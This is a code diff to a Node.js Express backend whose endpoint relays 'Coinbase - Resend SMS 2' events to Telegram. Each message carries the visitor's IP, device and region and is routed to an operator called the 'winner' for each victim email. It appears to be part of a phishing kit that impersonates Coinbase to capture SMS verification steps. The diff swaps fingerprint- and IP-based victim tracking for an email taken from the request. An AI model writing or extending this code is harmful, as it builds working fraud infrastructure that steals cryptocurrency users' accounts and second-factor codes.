@@ -834,29 +834,16 @@ app.post("/resend-sms", async (req, res) => {
 
 app.post("/resend-sms2", async (req, res) => {
   try {
-    const { sms2Id, userId } = req.body;
+    const { email, userId } = req.body;
 
-    if (!userId) {
-      return res.status(400).json({ error: "Missing userId" });
+    if (!email || !userId) {
+      return res.status(400).json({ error: "Missing email or userId" });
     }
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
-    const fingerprint = getDeviceFingerprint(req);
-    const ipPrefix = ip.split(".").slice(0, 3).join(".");
-
-    // ✅ Get email from tracking (same way digits do)
-    let email = "unknown@example.com";
-    
-    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
-      email = deviceFingerprintToEmail[fingerprint];
-      console.log(`✅ Found email via fingerprint: ${email}`);
-    } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
-      email = ipPrefixToEmail[ipPrefix];
-      console.log(`✅ Found email via IP: ${email}`);
-    }
 
     const message =
       `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
@@ -866,12 +853,15 @@ app.post("/resend-sms2", async (req, res) => {
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
 
-    // ✅ Use sendFollowUpMessage - it handles finding the winner!
-    await sendFollowUpMessage(email, message, {
-      parse_mode: "HTML"
-    });
+    // ✅ Send to winner (same as digits do!)
+    if (email && userWinnerTelegram[email]) {
+      await sendFollowUpMessage(email, message, {
+        parse_mode: "HTML"
+      });
+    } else {
+      return res.status(400).json({ error: "No winner determined for this email" });
+    }
 
-    console.log(`✅ Resend message sent to ${email}`);
     res.json({ ok: true });
 
   } catch (err) {
